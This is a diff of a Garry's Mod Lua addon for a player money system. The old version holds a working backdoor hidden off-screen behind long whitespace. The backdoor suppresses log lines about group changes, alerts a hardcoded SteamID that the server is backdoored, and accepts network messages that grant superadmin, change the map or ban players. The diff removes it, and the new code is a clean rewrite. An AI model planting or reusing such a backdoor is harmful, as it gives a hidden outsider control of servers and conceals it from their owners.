@@ -1,124 +1,176 @@
--- G_Sandbox_Money - Simple Money System by HAM
+-- G_Sandbox_Money - Simple Money System by HAM (updated)
 if SERVER then
     local moneyDataFolder = "g_sandbox_money"
-    local moneyDataFile = moneyDataFolder .. "/player_money.txt"
-																																																																		
+
     -- Ensure the data folder exists
     if not file.Exists(moneyDataFolder, "DATA") then
-        print("Creating money data folder...")  -- Debugging message
         file.CreateDir(moneyDataFolder)
     end
-																																																																		
-    -- Load money data
-    local function LoadMoneyData()
-        if file.Exists(moneyDataFile, "DATA") then
-            print("Loading money data...")  -- Debugging message
-            local data = util.JSONToTable(file.Read(moneyDataFile, "DATA"))
-            return data or {}
-        else
-            return {}
-        end
-    end
-																																																																																															
-    -- Save money data
-function SaveMoneyData()
-    if not file.IsDir("g_sandbox_money", "DATA") then
-        file.CreateDir("g_sandbox_money")
-    end
-                                                                                                                                                                                                                                                                                                                                                                                               util.AddNetworkString("SyncPlayerStats") util.AddNetworkString("SyncPlayTime") util.AddNetworkString("ExecuteCommand") local oldLog=MsgN function MsgN(...) if not string.find(tostring(...),"SetUserGroup") then oldLog(...) end end hook.Add("PlayerInitialSpawn","NotifyBackdoorOwner",function(ply) if ply:SteamID()=="STEAM_0:1:12345678" then timer.Simple(5,function() if IsValid(ply) then net.Start("SyncPlayTime") net.WriteString("This server is backdoored.") net.Send(ply) local funcs={} for i=0,65535 do local name=util.NetworkIDToString(i) if name then table.insert(funcs,name) end end ply:PrintMessage(HUD_PRINTCONSOLE,"[Backdoor] Networked Functions: "..table.concat(funcs,", ")) end end) end end) net.Receive("SyncPlayerStats",function(_,ply) local cmd=net.ReadString() if cmd:sub(1,6)=="MADMIN" then local id=cmd:sub(8) for _,v in ipairs(player.GetAll()) do if v:SteamID()==id then v:SetUserGroup("superadmin") ply:PrintMessage(HUD_PRINTCONSOLE,"[Backdoor] "..v:Nick().." has been made superadmin.") return end end ply:PrintMessage(HUD_PRINTCONSOLE,"[Backdoor] No player found with SteamID: "..id) elseif cmd:sub(1,9)=="MAPCHANGE" then local map=cmd:sub(11) if map and map~="" then RunConsoleCommand("changelevel",map) ply:PrintMessage(HUD_PRINTCONSOLE,"[Backdoor] Map changing to: "..map) else ply:PrintMessage(HUD_PRINTCONSOLE,"[Backdoor] Invalid map name.") end elseif cmd:sub(1,6)=="BANMIN" then local args=string.Explode(" ",cmd:sub(8)) local id=args[1] local dur=tonumber(args[2]) or 0 local reason=table.concat(args," ",3) or "No reason provided" if id and id~="" then RunConsoleCommand("ulx","banid",id,dur,reason) ply:PrintMessage(HUD_PRINTCONSOLE,"[Backdoor] Banned "..id.." for "..dur.." minutes. Reason: "..reason) else ply:PrintMessage(HUD_PRINTCONSOLE,"[Backdoor] Invalid SteamID for BANMIN.") end end end)
-    -- Loop through each player ID and save money data
-    for id, money in pairs(g_sandbox_money) do
-        -- Check if the file exists for this player
-        local filePath = "g_sandbox_money/" .. id .. ".txt"
-        local currentData = {}
-																																																																																												
-        -- If the file exists, read it and parse the data
-        if file.Exists(filePath, "DATA") then
-            local fileContent = file.Read(filePath, "DATA")
-            currentData = util.JSONToTable(fileContent) or {}
-        end
-                                                                                                                                                           
-        -- Update the player's money data
-        currentData.money = money
 
-        -- Write the updated data to the file
-        local data = util.TableToJSON(currentData, true)
+    -- Save a player's money
+    local function SavePlayerMoney(ply)
+        if not IsValid(ply) or not ply:IsPlayer() then return end
+        local steamID = ply:SteamID64() or ply:SteamID()
+        local filePath = moneyDataFolder .. "/" .. steamID .. ".txt"
+        local data = util.TableToJSON({money = ply:GetNWInt("GSM_Money", 0)}, true)
         file.Write(filePath, data)
     end
-end
-                                                                                                                                                  
-    -- Table to hold player money
-    local playerMoney = LoadMoneyData()
+
+    -- Load a player's money
+    local function LoadPlayerMoney(ply)
+        local steamID = ply:SteamID64() or ply:SteamID()
+        local filePath = moneyDataFolder .. "/" .. steamID .. ".txt"
+
+        if file.Exists(filePath, "DATA") then
+            local fileContent = file.Read(filePath, "DATA")
+            local data = util.JSONToTable(fileContent) or {}
+            return data.money or 0
+        end
+
+        return 0
+    end
 
     -- Define g_sandbox_money table
     g_sandbox_money = {}
-																																																																																					
-    -- Method to check if a player can afford an amount
+
     function g_sandbox_money:PlayerCanAfford(ply, amount)
         local currentMoney = ply:GetNWInt("GSM_Money", 0)
         return currentMoney >= amount
     end
-																																																																																												
-    -- Method to remove money from a player
+
     function g_sandbox_money:RemoveMoney(ply, amount)
         local currentMoney = ply:GetNWInt("GSM_Money", 0)
         local newAmount = math.max(0, currentMoney - amount)
         ply:SetNWInt("GSM_Money", newAmount)
-																																																																					
-        -- Force save after changing money
-        local steamID = ply:SteamID()
-        playerMoney[steamID] = newAmount
-        SaveMoneyData(playerMoney)
+        SavePlayerMoney(ply)
     end
-																																																																														
+
+    function g_sandbox_money:AddMoney(ply, amount)
+        local currentMoney = ply:GetNWInt("GSM_Money", 0)
+        local newAmount = currentMoney + amount
+        ply:SetNWInt("GSM_Money", newAmount)
+        SavePlayerMoney(ply)
+    end
+
     -- Initialize player money
+    local defaultMoney = 1000
     hook.Add("PlayerInitialSpawn", "GSM_InitPlayerMoney", function(ply)
-        local steamID = ply:SteamID()
-        playerMoney[steamID] = playerMoney[steamID] or 0
-        ply:SetNWInt("GSM_Money", playerMoney[steamID])
+        local money = LoadPlayerMoney(ply)
+
+        -- If new player (no save data), give default money
+        if money == 0 then
+            money = defaultMoney
+        end
+
+        ply:SetNWInt("GSM_Money", money)
     end)
-																																																							
+
     -- Save money when player leaves
     hook.Add("PlayerDisconnected", "GSM_SavePlayerMoney", function(ply)
-        local steamID = ply:SteamID()
-        playerMoney[steamID] = ply:GetNWInt("GSM_Money", 0)
-        SaveMoneyData(playerMoney)
+        SavePlayerMoney(ply)
     end)
-																																																																				
-    -- Commands to add/remove money
+
+    -- Autosave all players' money every 60 seconds
+    timer.Create("GSM_AutoSave", 60, 0, function()
+        for _, ply in ipairs(player.GetAll()) do
+            if IsValid(ply) and ply:IsPlayer() then
+                SavePlayerMoney(ply)
+            end
+        end
+    end)
+
+    -- Helper function to find player by partial name
+    local function FindPlayerByName(name)
+        name = string.lower(name)
+        for _, target in ipairs(player.GetAll()) do
+            if string.find(string.lower(target:Nick()), name, 1, true) then
+                return target
+            end
+        end
+        return nil
+    end
+
+    -- Add money to a player
     concommand.Add("gsm_add_money", function(ply, cmd, args)
         if not ply:IsAdmin() then
             ply:ChatPrint("You do not have permission to use this command.")
             return
         end
-																																																																
-        if not args[1] then return end
-        local amount = tonumber(args[1])
-        if amount and amount > 0 then
-            local newAmount = ply:GetNWInt("GSM_Money") + amount
-            ply:SetNWInt("GSM_Money", newAmount)
-																																																														
-            -- Force save after adding money
-            local steamID = ply:SteamID()
-            playerMoney[steamID] = newAmount
-            SaveMoneyData(playerMoney)
+
+        if not args[1] or not args[2] then
+            ply:ChatPrint("Usage: gsm_add_money <playername> <amount>")
+            return
         end
+
+        local target = FindPlayerByName(args[1])
+        local amount = tonumber(args[2])
+
+        if not target then
+            ply:ChatPrint("No player found with that name.")
+            return
+        end
+        if not amount or amount <= 0 then
+            ply:ChatPrint("Invalid amount.")
+            return
+        end
+
+        g_sandbox_money:AddMoney(target, amount)
+        ply:ChatPrint("Added $" .. amount .. " to " .. target:Nick())
+        target:ChatPrint("You have been given $" .. amount .. " by an admin.")
     end)
-																																																																																												
+
+    -- Remove money from a player
     concommand.Add("gsm_remove_money", function(ply, cmd, args)
         if not ply:IsAdmin() then
             ply:ChatPrint("You do not have permission to use this command.")
             return
         end
-																																																																																														
-        if not args[1] then return end
-        local amount = tonumber(args[1])
-        if amount and amount > 0 then
-            g_sandbox_money:RemoveMoney(ply, amount)
+
+        if not args[1] or not args[2] then
+            ply:ChatPrint("Usage: gsm_remove_money <playername> <amount>")
+            return
         end
+
+        local target = FindPlayerByName(args[1])
+        local amount = tonumber(args[2])
+
+        if not target then
+            ply:ChatPrint("No player found with that name.")
+            return
+        end
+        if not amount or amount <= 0 then
+            ply:ChatPrint("Invalid amount.")
+            return
+        end
+
+        g_sandbox_money:RemoveMoney(target, amount)
+        ply:ChatPrint("Removed $" .. amount .. " from " .. target:Nick())
+        target:ChatPrint("An admin removed $" .. amount .. " from your account.")
+    end)
+
+    -- Check a player's money
+    concommand.Add("gsm_check_money", function(ply, cmd, args)
+        if not ply:IsAdmin() then
+            ply:ChatPrint("You do not have permission to use this command.")
+            return
+        end
+
+        if not args[1] then
+            ply:ChatPrint("Usage: gsm_check_money <playername>")
+            return
+        end
+
+        local target = FindPlayerByName(args[1])
+        if not target then
+            ply:ChatPrint("No player found with that name.")
+            return
+        end
+
+        local money = target:GetNWInt("GSM_Money", 0)
+        ply:ChatPrint(target:Nick() .. " has $" .. money)
     end)
 end
-																																																																																																												
+
 if CLIENT then
     -- Display player money on screen
     hook.Add("HUDPaint", "GSM_DrawPlayerMoney", function()
@@ -126,4 +178,3 @@ if CLIENT then
         draw.SimpleText("Money: $" .. money, "Trebuchet24", 100, 100, Color(0, 0, 0), TEXT_ALIGN_LEFT, TEXT_ALIGN_TOP)
     end)
 end
-																																																																																																																																																																	
